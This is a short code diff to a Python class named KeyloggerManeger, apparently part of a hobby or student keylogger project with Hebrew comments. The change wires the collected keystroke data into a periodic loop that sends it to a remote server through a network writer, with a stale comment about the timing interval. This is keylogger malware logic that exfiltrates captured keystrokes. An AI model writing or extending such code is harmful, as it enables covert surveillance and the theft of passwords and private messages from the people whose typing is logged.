@@ -16,7 +16,7 @@ class KeyloggerManeger:
 
 
     def getdata(self):
-
+       # return  self.keylogger.data
        return self.file_writer.save_to_json(self.keylogger.data)
 
 
@@ -26,13 +26,15 @@ class KeyloggerManeger:
 
     def send_data_to_server(self):
 
-        self.network_writer.send_data()
-       # self.data.clear()  # ננקה את הנתונים רק אם השליחה הצליחה
+
+        data = self.getdata()
+        if data:
+            self.network_writer.send_data(data)
 
     def f(self):
         try:
             while True:
-                time.sleep(2)  # כל 15 שניות שולח נתונים
+                time.sleep(5)  # כל 15 שניות שולח נתונים
                 self.send_data_to_server()
         except KeyboardInterrupt:
             print("Keylogger stopped.")
